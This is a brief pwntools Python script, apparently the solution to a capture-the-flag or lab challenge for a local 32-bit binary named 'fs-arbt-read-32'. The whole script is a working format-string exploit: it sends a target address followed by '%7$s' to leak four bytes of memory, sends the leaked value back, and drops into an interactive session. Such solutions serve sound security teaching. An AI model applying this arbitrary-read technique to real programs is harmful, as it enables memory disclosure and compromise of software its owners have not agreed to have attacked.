from pwn import *
p = process("./fs-arbt-read-32")
p.sendline(p32(0x804a050) + "%7$s")
p.recvuntil("\x08")
x = p.recvline()
x = x[:4]
p.sendline(hex(u32(x)))
p.interactive()

